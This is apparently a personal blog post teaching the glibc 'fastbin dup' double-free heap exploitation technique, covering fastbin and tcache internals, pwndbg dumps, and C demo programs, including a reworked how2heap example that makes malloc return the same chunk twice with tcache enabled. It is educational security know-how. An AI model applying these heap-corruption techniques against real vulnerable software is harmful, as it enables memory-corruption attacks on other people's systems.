---
title: "Fastbin dup with tcache"
date: 2022-08-30T15:09:57+02:00
---
While learning the **fastbin dup** attack, all the online resources I found
made the same assumptions: GLIBC is either compiled without `tcache`
support, or in one of the exploit steps `calloc` is called instead of 
`malloc`, and that made me confused.

In this article I will cover how to use the **fastbin dup** attack with a
modern GLIBC and shed some light on this exploitation technique.

## The original **fastbin dup** attack
The original fastbin dup attack leverages a so-called *double free*. 
A double free occurs when you call `free` on an already `free`'d chunk.
The **fastbin dup** attack takes advantage of the double free and
forces `malloc` to return the same chunk two times.
This can later be used to edit the chunk's metadata and obtain an
arbitrary read/write primitive.

### What is a fastbin?
A fastbin is one of the freelists that `malloc` uses to keep track of
free chunks. Bins are usually differentiated based on the size of chunks 
they contain. There are 10 fastbins, each containing a non-circular 
singly linked list of different single-sized chunks.

The first fastbin contains `0x20` sized chunks, the second fastbin
contains `0x30` sized chunks, the third `0x40`, up to the tenth
that contains `0xb0` sized chunks. Under default conditions, only the first
7 fastbins are available.

When a chunk is `free`'d into a fastbin, that chunk is linked to the
HEAD of the fastbin. The fastbins' HEAD pointers are stored in the
`main_arena` variable, which is of type `malloc_state`.
``` C
// glibc/malloc/malloc.c
struct malloc_state
{
  /* Serialize access.  */
  __libc_lock_define (, mutex);

  /* Flags (formerly in max_fast).  */
  int flags;

  /* Set if the fastbin chunks contain recently inserted free blocks.  */
  /* Note this is a bool but not all targets support atomics on booleans.  */
  /* This field is only present from glibc 2.26 onwards, it was part of
     flags before */
  int have_fastchunks;

  /* Fastbins */
  mfastbinptr fastbinsY[NFASTBINS];

  /* Base of the topmost chunk -- not otherwise kept in a bin */
  mchunkptr top;

  /* The remainder from the most recent split of a small request */
  mchunkptr last_remainder;

  /* ... other fields that we won't cover */
};
```
This roughly translates to the following scheme. It is not complete, since
`main_arena` has many more fields, but they are not relevant to our 
discussion now. 

![A table representing the struct main_arena](/main_arena_partial_layout.svg)
If you're curious about the actual fields contained in the
`malloc_state` struct, you can check them out
[in the source code](https://elixir.bootlin.com/glibc/glibc-2.36/source/malloc/malloc.c#L1824).

The following picture shows how the `0x20` fastbin could look like
once some chunks are `free`'d into it. Note how the first quadword of user
data gets repurposed as an `fd` pointer. The NULL pointer of the third
chunk indicates that no further chunks are linked into the list.

Please also note how malloc pointers point eight bytes before the size field.

![A picture representing how the fastbin list looks like](/fastbin.svg)

## When does a chunk get linked into a fastbin?
In GLIBCs that **do not have support for `tcache`** or have been compiled 
**without support for `tcache`**, a free chunk that fits in a fastbin's size
gets linked into that fastbin.

``` C
// fastbin_demo_no_tcache.c
//
// glibc 2.36 compiled without tcache
// gcc -o fastbins_demo_no_tcache fastbin_demo_no_tcache.c -g
#include <stdio.h>
#include <stdlib.h>

int main() {
  // This is needed to prevent printf buffer (which is stored
  // in the heap) messes everything up.
  setbuf(stdout, 0);

  void *a = malloc(0x18);
  void *b = malloc(0x18);
  free(a);
  free(b);

  return 0;
}
```

If we added a breakpoint to the `return 0` instruction, we would see that
the fastbin contains only the chunk A.

Let's check it.

```
pwndbg> vis
0x603000	0x0000000000000000	0x0000000000000021	........!.......	<-- fastbins[0x20][1]
0x603010	0x0000000000000000	0x0000000000000000	................
0x603020	0x0000000000000000	0x0000000000000021	........!.......	<-- fastbins[0x20][0]
0x603030	0x0000000000603000	0x0000000000000000	.0`.............
0x603040	0x0000000000000000	0x0000000000020fc1	................	<-- Top chunk

pwndbg> fastbins
fastbins
0x20: 0x603020 -> 0x603000 <- 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
```

We can see two chunks: chunk A, starting at `0x603000` and chunk B,
starting at `0x603020`. Since chunk A has been `free`'d first, it appears 
last in the fastbin freelist. Note how the first quadword of chunk B 
has been repurposed to hold the `fd` pointer, which points to the following
chunk in the `0x20` fastbin, chunk A.

After chunk B we can see a strange value (`0x20fc1`). This is part 
of the top chunk, and holds the remaining space in the current arena.
When a request's size exceeds the top chunk size field, `malloc` tries
to request additional space from the OS to serve the request.

## When does a chunk get linked out of a fastbin?
In GLIBCs that don't support `tcache` or are compiled without support 
for `tcache`, when a request size matches the fastbin range, `malloc` checks 
for free chunks in the correct size fastbin. If the bin's not empty, `malloc`
allocates a chunk from the head of the fastbin, removing it from the list.

## The double free vulnerability
With everything we've learned so far, we know that if we `free` a proper
sized chunk, this gets linked into a list of free chunks, called *fastbin*.

When a same sized request arrives, in GLIBCs that don't support `tcache`,
`malloc` tries to allocate a chunk looking into the fastbin first and 
then falling back to allocate a new chunk. 

What happens if we try to free the same chunk two times? Based on what we 
know, we might expect to see it linked two times in the fastbin.

Let's try that and see what happens.

``` C
// double_free_demo_no_tcache.c
//
// glibc 2.36 compiled without tcache
// gcc -o double_free_demo_no_tcache double_free_demo_no_tcache.c -g

#include <stdio.h>
#include <stdlib.h>

int main() {
  // This is needed to prevent printf buffer (which is stored
  // in the heap) messing everything up.
  setbuf(stdout, 0);

  void *a = malloc(0x18);

  free(a);
  free(a);
}

// If we run it, we get the following message:
// double free or corruption (fasttop)
// fish: Job 1, './double_free_demo_no_tcache' terminated by signal SIGABRT (Abort)
```
The program explodes with a message, saying 
`double free or corruption (fasttop)`. We have hit one of the GLIBC heap
hardening measures. We can search the source code to find [the offending
line](https://elixir.bootlin.com/glibc/glibc-2.36/source/malloc/malloc.c#L4534). 
`malloc` checks if the head pointer of the fastbin is the same as the chunk
being `free`'d. To bypass this check we can `free` another chunk between 
the two `free(a)` calls.

``` C
// double_free_2_demo_no_tcache.c
//
// glibc 2.36 compiled without tcache
// gcc -o double_free_2_demo_no_tcache double_free_2_demo_no_tcache.c -g

#include <stdio.h>
#include <stdlib.h>

int main() {
  // This is needed to prevent printf buffer (which is stored
  // in the heap) messing everything up.
  setbuf(stdout, 0);

  void *a = malloc(0x18);
  void *b = malloc(0x18);

  free(a);
  free(b);
  free(a);

  return 0;
}
```
This time the program doesn't explode and behaves. Let's see what happens 
with `pwndbg`.
```
pwndbg> vis

0x603000	0x0000000000000000	0x0000000000000021	........!.......	<-- fastbins[0x20][0], fastbins[0x20][0]
0x603010	0x0000000000603020	0x0000000000000000	0`.............
0x603020	0x0000000000000000	0x0000000000000021	........!.......	<-- fastbins[0x20][1]
0x603030	0x0000000000603000	0x0000000000000000	.0`.............
0x603040	0x0000000000000000	0x0000000000020fc1	................	<-- Top chunk

pwndbg> fastbins
fastbins
0x20: 0x603000 —▸ 0x603020 ◂— 0x603000
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0

pwndbg> dq &main_arena 14
00007ffff7dcfb60     0000000000000000 0000000000000001
00007ffff7dcfb70     0000000000603000 0000000000000000 <--- the first quadword is the head to the 0x20 fastbin
00007ffff7dcfb80     0000000000000000 0000000000000000
00007ffff7dcfb90     0000000000000000 0000000000000000
00007ffff7dcfba0     0000000000000000 0000000000000000
00007ffff7dcfbb0     0000000000000000 0000000000000000
00007ffff7dcfbc0     0000000000603040 0000000000000000 <--- the top chunk pointer
```
We turned a non circular linked list into one. If we now request a chunk, 
`malloc` will hand us the chunk starting at `0x603000` and it will set the
top of the `0x20` fastbin to the `fd` of the `0x603000` chunk, removing it
from the fastbin. At this point, the head of the `0x20` fastbin points to
`0x603020`, if we `malloc(0x18)` again, `malloc` will return the `0x603020`
chunk. 
As always, before returning the chunk to the user, `malloc` will remove the
chunk from the fastbin, setting the head of the fastbin to the chunk's `fd`
pointer. But this `fd` pointer is the same of the first `malloc` allocation.

``` C
#include <stdio.h>
#include <stdlib.h>

int main() {
  // This is needed to prevent printf buffer (which is stored
  // in the heap) messing everything up.
  setbuf(stdout, 0);

  void *a = malloc(0x18);
  void *b = malloc(0x18);

  free(a);
  free(b);
  free(a);

  a = malloc(0x18);
  malloc(0x18);
  b = malloc(0x18);

  printf("A points to %p\n", a);
  printf("B points to %p\n", b);

  return 0;
}
```
The **fastbin dup** attack has worked, `a` and `b` point to the same address.
So far the attack is straightforward. But what happens if we throw `tcache` 
in the mix?

If we try to execute the code above on a `tcache` enabled GLIBC, the program
aborts with `free(): double free detected in tcache 2`. 
Let's head into what is this `tcache`.

## Tcache
The `tcache` is a per-thread cache that contains a small collection of chunks
that can be accessed without needing to lock an arena, offering a substantial
performance optimization in certain workloads.

These chunks are stored as an array of singly-linked lists, like fastbins,
but with links pointing to the payload (user data), not the chunk header
(as opposed to fastbins). 

Each bin contains one size chunk, so the array is indexed by chunk size. 
Unlike fastbins, the `tcache` is limited in how many chunks are allowed 
in each bin. The `tcache_count` field in struct [`malloc_par`](
https://elixir.bootlin.com/glibc/glibc-2.36/source/malloc/malloc.c#L1868
) defines this limit. The [default value](https://elixir.bootlin.com/glibc/glibc-2.36/source/malloc/malloc.c#L1939) is `7`.
This limit can be changed using [*Tunables*](https://www.gnu.org/software/libc/manual/html_node/Tunables.html).

When the `tcache` bin is empty for a given requested size, the request is
**passed to the normal malloc routines**.

The *tcachebins* hold chunk sizes that span from `0x20` to `0x410` bytes.
`tcache` saves the number of chunks linked in every tcachebin in an array of
counters called [`counts`](https://elixir.bootlin.com/glibc/glibc-2.36/source/malloc/malloc.c#L3134),
in the `tcache_perthread_struct`.

## When does a chunk get linked in a fastbin when `tcache` is enabled?
When a `free`'d chunk is in tcachebin range, the free algorithm tries
to link the chunk there.
When there's no more room for other chunks in the tcachebin 
(i.e. the number of linked chunks in a tcachebin equals `tcache_count`) and
the size is valid for a fastbin, the chunk is linked into the relevant
fastbin instead.

## When does a chunk get linked out of a fastbin when `tcache` is enabled?
When a request size is in the fastbins range, since the tcachebins and the 
fastbins' sizes partially overlap, malloc tries to service the request
from the relevant tcachebin first.
If the tcachebin is empty, malloc falls back to fastbins.

## Tcache double-free protection
One could think that we could attack tcachebins in the same way we attacked
fastbins, but `tcache` has some quirks that make them harder to exploit.

In `tcache` chunks, the second quadword of user data is repurposed as a
`key` value. When a chunk is linked into a tcachebin, the `key` field is
set to a pointer to a malloc struct. 

When a new chunk is a candidate for `free`, the `key` field is checked:
if it matches the malloc struct's address, the candidate chunk's
address is checked against every chunk in the tcachebin,
if `free` finds a match, the program aborts.

A simple bypass would be to overwrite the `key` field with a random value,
but that's not always possible, depending on the bug primitives you have
available. 

The introduction of the [`safe linking`](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/)
protections in newer GLIBCs makes things even harder without a heap leak.

However, the bypass of the tcachebin double-free protections is out
of the scope of this article.

If we control a sufficient number of `malloc`s and `free`s, we can bypass
the use of tcachebins altogether and fall back to fastbins, 
in order to perform a standard **fastbin dup** attack, even with the
`tcache` enabled.

## The exploit on how2heap that accounts for `tcache` but uses `calloc` (?)
Legendary CTF super-team Shellphish manages a public repository on GitHub, 
called [how2heap](https://github.com/shellphish/how2heap), that demonstrates
the most famous heap exploits and vulnerabilities. 
The [**fastbin dup** attack](
https://github.com/shellphish/how2heap/blob/e92b2d7ebd28335aee59c3aab4bd231c0c379f98/glibc_2.35/fastbin_dup.c) is also covered.

Their demo exploit accounts for the presence of the `tcache` filling the 
tcachebins before proceeding to the actual attack.

After this, it uses the `calloc` function instead of `malloc` to allocate 
chunks, and this, at first, confused me a lot.

Turns out that `calloc` **does not allocate from the `tcache`**.
This made me even more confused.

Does this mean that the **fastbin dup** attack does not work unless `calloc`
is used instead of `malloc`, while using GLIBCs with `tcache`?
Fortunately no, I guess the shellphish team used calloc for clarity
and to avoid useless clutter, but it made me scratch my bald head for
quite a minute.

I managed to make the shellphish exploit work with `malloc`s only. It's a
little more cluttered, but it works.

You only have to keep in mind the cases when malloc and free turn to fastbin,
keeping the tcachebins full or empty, based on our needs.

For example, when we need to put the three chunks in the fastbin, we have to
make sure that the tcachebin is full. 
Likewise, when we need to get the chunks out of the fastbin,
we need to make sure that the tcachebin is empty.

The shellphish exploit edit with only `malloc`s is described and 
commented here.
``` C
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

int main()
{
    setbuf(stdout, NULL);
  
    printf("This file demonstrates a simple double-free attack with fastbins.\n");
  
    printf("Allocating 3 buffers.\n");
    int *a = malloc(8);
    int *b = malloc(8);
    int *c = malloc(8);
   
    printf("Fill up tcache.\n");
    void *ptrs[12];
    for (int i=0; i<7; i++) {
        ptrs[i] = malloc(8);
    }
      
    // tcache fill
    for (int i=0; i<7; i++) {
        free(ptrs[i]);
    }

    printf("1st malloc(8): %p\n", a);
    printf("2nd malloc(8): %p\n", b);
    printf("3rd malloc(8): %p\n", c);
  
    printf("Freeing the first one...\n");
    // should go in fastbin, since tcache is full
    //
    free(a);
  
    printf("If we free %p again, things will crash because %p is at the top of the free list.\n", a, a);
    // free(a);
  
    printf("So, instead, we'll free %p.\n", b);
    // should go in fastbin too
    free(b);
  
    printf("Now, we can free %p again, since it's not the head of the free list.\n", a);
    // double free
    free(a);
  
    // empty tcache, so that `malloc` has to look into fastbins
    for (int i=0; i<7; i++) {
        ptrs[i] = malloc(8);
    }
    
    printf("Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n", a, b, a, a);
    a = malloc(8);
    b = malloc(8);
    c = malloc(8);
    printf("1st malloc(8): %p\n", a);
    printf("2nd malloc(8): %p\n", b);
    printf("3rd malloc(8): %p\n", c);
  
    assert(a == c);
}
```

## Conclusions
We learned how to use the **fastbin dup** attack, even with the `tcache` 
enabled.

I hope that I didn't forget anything or didn't commit any major error.
For anything, errors, ideas or if you just want to say hi, don't esitate 
to contact me on Telegram (see About page) or via e-mail at
manuel[dot]romei[at]outlook[dot]it.

Pwn the world and have fun!
